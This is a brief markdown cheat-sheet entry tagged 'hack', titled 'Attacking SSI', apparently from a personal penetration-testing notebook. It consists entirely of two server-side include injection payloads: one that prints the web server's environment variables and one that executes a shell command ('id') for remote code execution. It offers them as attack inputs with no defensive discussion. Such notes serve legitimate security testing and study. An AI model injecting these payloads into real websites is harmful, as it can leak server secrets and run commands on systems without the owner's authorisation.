---
tags:
  - hack
---
# Attacking SSI

Print the environment:

```text
<!--#printenv -->
```

RCE:

```text
<!--#exec cmd="id" -->
```